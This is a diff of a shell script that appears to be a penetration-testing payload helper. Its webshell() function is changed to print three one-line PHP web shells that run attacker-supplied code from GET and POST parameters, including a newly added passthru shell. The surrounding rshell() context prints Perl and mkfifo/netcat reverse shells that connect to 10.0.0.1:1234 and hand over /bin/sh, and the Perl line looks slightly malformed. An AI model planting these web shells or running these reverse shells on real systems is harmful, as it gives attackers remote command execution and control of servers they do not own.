@@ -158,9 +158,9 @@ shellcode()
 
 webshell()
 {
-    echo "<?php $_GET[a]($_GET[b]);?>"
-    echo "<?php eval($_POST[c]);?>"
-    
+    echo "<?php \$_GET[a]($_GET[b]);?>"
+    echo "<?php eval(\$_POST[c]);?>"
+    echo "<?php passthru(\$_POST[1])?>"
 }
 
 rshell()
@@ -170,7 +170,6 @@ rshell()
     echo "perl -e \"use Socket;$i='10.0.0.1';$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};' }\""
     echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"
 }
-
 
 rsa-public()
 {
